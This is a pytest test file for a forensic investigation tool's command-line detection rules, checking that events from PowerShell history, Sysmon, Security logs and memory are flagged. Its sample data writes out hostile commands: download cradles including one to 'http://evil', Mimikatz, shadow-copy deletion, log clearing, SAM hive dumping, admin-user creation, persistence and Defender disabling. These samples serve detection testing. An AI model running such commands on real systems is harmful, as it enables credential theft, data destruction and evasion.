from datetime import datetime, timedelta, timezone

import pytest

from investigation.core.commands import MEMORY_CONSOLE, collect_commands, match_patterns
from investigation.core.models import Event
from investigation.core.requirements import Context
from investigation.core.store import EventStore
from investigation.modules.detections.commands import CommandRules

T0 = datetime(2026, 1, 1, tzinfo=timezone.utc)
SYSMON = "Microsoft-Windows-Sysmon/Operational"
PS = "Microsoft-Windows-PowerShell/Operational"


def ev(artifact, minutes=0, source_file="x", user=None, tags=(), message="", **fields):
    return Event(timestamp=T0 + timedelta(minutes=minutes), timestamp_desc="x", artifact=artifact,
                 source_file=source_file, message=message or artifact, user=user, fields=fields, tags=tags)


def store_of(tmp_path, events, name="t.db"):
    store = EventStore(tmp_path / name)
    store.add_many(events)
    return store


SAMPLES = [
    ("INV-CMD-001", ev("powershell_history", command="IEX (New-Object Net.WebClient).DownloadString('http://x/a')")),
    ("INV-CMD-001", ev("live_process", name="powershell.exe", pid=7, cmdline="powershell -nop -enc SQBFAFgA")),
    ("INV-CMD-001", ev("evtx", Channel="Security", EventID=4688, NewProcessName="c:\\x.exe",
                       CommandLine="cmd /c curl http://evil/x.exe -o x.exe")),
    ("INV-CMD-002", ev("memory_cmdline", Process="powershell.exe", PID=9, Args="powershell Invoke-Mimikatz")),
    ("INV-CMD-003", ev("memory_console", Process="conhost.exe", PID=4, Data="vssadmin delete shadows /all /quiet")),
    ("INV-CMD-003", ev("evtx", Channel=SYSMON, EventID=1, Image="c:\\wmic.exe", CommandLine="wmic shadowcopy delete")),
    ("INV-CMD-003", ev("evtx", Channel=PS, EventID=4104, ScriptBlockText="bcdedit /set {default} recoveryenabled no")),
    ("INV-CMD-004", ev("evtx", Channel=PS, EventID=4103, Payload="wevtutil cl Security")),
    ("INV-CMD-005", ev("mru", message="Run: net user bob P@ss /add", value="net user bob P@ss /add")),
    ("INV-CMD-005", ev("powershell_history", command="net localgroup administrators bob /add")),
    ("INV-CMD-006", ev("live_process", name="reg.exe", pid=1, cmdline="reg save HKLM\\SAM c:\\s.hiv")),
    ("INV-CMD-007", ev("powershell_history", command="certutil -urlcache -f http://x/a.exe a.exe")),
    ("INV-CMD-007", ev("powershell_history", command="bitsadmin /transfer j http://x/a c:\\a")),
    ("INV-CMD-008", ev("powershell_history", command="schtasks /create /tn x /tr c:\\a.exe /sc daily")),
    ("INV-CMD-008", ev("powershell_history", command="sc create evil binPath= c:\\a.exe")),
    ("INV-CMD-009", ev("powershell_history", command="Set-MpPreference -DisableRealtimeMonitoring $true")),
    ("INV-CMD-009", ev("powershell_history", command="Add-MpPreference -ExclusionPath C:\\Temp")),
]


@pytest.mark.parametrize("rule_id,event", SAMPLES)
def test_pattern_matches_per_source(rule_id, event):
    from investigation.core.commands import _extract

    command = _extract(event)[1]
    assert rule_id in {p.id for p in match_patterns(command)}


def test_benign_commands_do_not_match(tmp_path):
    benign = [ev("powershell_history", command="Get-ChildItem"),
              ev("live_process", name="cmd.exe", pid=3, cmdline="ipconfig /all"),
              ev("evtx", Channel="Security", EventID=4688, NewProcessName="c:\\a.exe", CommandLine="ipconfig /all")]
    store = store_of(tmp_path, benign)
    rows = collect_commands(store)
    assert len(rows) == 3 and all(not r.rules for r in rows)
    assert list(CommandRules().detect(store, Context())) == []


def test_findings_skip_what_existing_rules_already_report(tmp_path):
    cradle = "powershell -nop -enc SQBFAFgA"
    store = store_of(tmp_path, [
        ev("evtx", Channel=PS, EventID=4104, ScriptBlockText=cradle),
        ev("evtx", Channel="Security", EventID=4688, NewProcessName="c:\\v.exe",
           CommandLine="vssadmin delete shadows /all"),
    ])
    assert list(CommandRules().detect(store, Context())) == []
    rows = collect_commands(store)
    assert all(r.rules for r in rows)
    other = store_of(tmp_path, [ev("live_process", name="p.exe", pid=1, cmdline=cradle)], "other.db")
    assert [f.rule_id for f in CommandRules().detect(other, Context())] == ["INV-CMD-001"]


def test_sources_users_and_ordering(tmp_path):
    store = store_of(tmp_path, [
        ev("powershell_history", source_file="b/hist.txt", user="bob", command="whoami"),
        ev("evtx", 5, Channel="Security", EventID=4688, NewProcessName="c:\\w.exe", NewProcessId="0x4",
           CommandLine="whoami /all", user="alice"),
        ev("evtx", 1, Channel=SYSMON, EventID=1, Image="c:\\p.exe", ProcessId=8, CommandLine="p.exe -x"),
        ev("memory_cmdline", source_file="a/mem.raw:windows.cmdline", Process="cmd.exe", PID=2, Args="cmd.exe /k"),
        ev("mru", message="Run: calc", value="calc"),
        ev("mru", message="Other: x", value="x"),
        ev("evtx", Channel="Security", EventID=4624, CommandLine="ignored"),
    ])
    rows = collect_commands(store)
    assert [r.source for r in rows] == ["Sysmon 1", "Security 4688", "Memory cmdline", "PowerShell history", "RunMRU"]
    assert rows[1].user == "alice" and rows[1].process == "c:\\w.exe pid=0x4" and rows[0].process == "c:\\p.exe pid=8"
    assert rows[0].time is not None and rows[2].time is None


def test_long_script_block_keeps_full_text(tmp_path):
    text = "A" * 1000
    rows = collect_commands(store_of(tmp_path, [ev("evtx", Channel=PS, EventID=4104, ScriptBlockText=text)]))
    assert rows[0].command == text and rows[0].head == "A" * 300 and rows[0].rest == "A" * 700


def test_duplicate_memory_console_and_vss_twins_counted_once(tmp_path):
    store = store_of(tmp_path, [
        ev("memory_console", source_file="m.raw:windows.cmdscan", Process="conhost.exe", PID=4, Data="whoami"),
        ev("memory_console", source_file="m.raw:windows.consoles", Process="conhost.exe", PID=4, Data="whoami"),
        ev("evtx", Channel=PS, EventID=4104, ScriptBlockText="dir"),
        ev("evtx", Channel=PS, EventID=4104, ScriptBlockText="dir", tags=("vss",)),
    ])
    rows = collect_commands(store)
    assert sorted(r.command for r in rows) == ["dir", "whoami"]
    assert [r.source for r in rows if r.command == "whoami"] == [MEMORY_CONSOLE]


def test_script_block_with_no_matching_evtx_rule_is_still_reported(tmp_path, monkeypatch):
    monkeypatch.setenv("INVESTIGATION_HOME", str(tmp_path / "home"))
    store = store_of(tmp_path, [
        ev("evtx", Channel=PS, EventID=4104, ScriptBlockText="vssadmin delete shadows /all /quiet"),
        ev("evtx", Channel=PS, EventID=4104, ScriptBlockText="powershell -nop -enc SQBFAFgA"),
    ])
    findings = {f.rule_id: f for f in CommandRules().detect(store, Context())}
    assert set(findings) == {"INV-CMD-003"}
    assert findings["INV-CMD-003"].events[0].fields["ScriptBlockText"].startswith("vssadmin")
